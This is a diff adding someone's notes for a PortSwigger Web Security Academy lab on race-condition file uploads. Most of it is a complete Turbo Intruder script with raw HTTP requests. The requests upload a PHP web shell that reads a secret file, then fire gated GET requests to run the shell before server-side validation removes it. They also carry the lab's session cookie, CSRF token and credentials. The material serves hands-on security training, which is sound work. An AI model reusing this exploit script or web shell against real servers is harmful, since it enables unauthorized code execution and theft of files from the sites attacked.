@@ -1,0 +1,116 @@
+Web shell upload via race condition
+Goal: Exploit file upload vulnerability to exfiltrate the contents of the /home/carlos/secret file
+wiener:peter
+
+1)
+-login
+-upload image
+
+2)
+-upload shell
+-send post of shell and get image to repeater to evaluate
+-change image to shell.php
+
+3)
+-send post to turbo intruder
+-paste this in to the editor
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''POST /my-account/avatar HTTP/2
+Host: 0a21000a040d23ee82a3c5e4009e0021.web-security-academy.net
+Cookie: session=T3JJfZtwcFBg6JE0WGT0luLJrSg16YoL
+Content-Length: 515
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+Origin: https://0a21000a040d23ee82a3c5e4009e0021.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2B9Dt1j9cbl2bOK4
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a21000a040d23ee82a3c5e4009e0021.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+------WebKitFormBoundary2B9Dt1j9cbl2bOK4
+Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php
+// Webshell to read a specific file
+echo file_get_contents('/home/carlos/secret');
+?>
+
+------WebKitFormBoundary2B9Dt1j9cbl2bOK4
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundary2B9Dt1j9cbl2bOK4
+Content-Disposition: form-data; name="csrf"
+
+LGDwQvxXhYBCraAAABPaLDra3msVsdOh
+------WebKitFormBoundary2B9Dt1j9cbl2bOK4--'''
+
+    request2 = '''GET /files/avatars/shell.php HTTP/2
+Host: 0a21000a040d23ee82a3c5e4009e0021.web-security-academy.net
+Cookie: session=T3JJfZtwcFBg6JE0WGT0luLJrSg16YoL
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+If-Modified-Since: Thu, 03 Oct 2024 19:36:23 GMT
+If-None-Match: "1f1f-62397ab685c16"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a21000a040d23ee82a3c5e4009e0021.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i\r\n
+'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
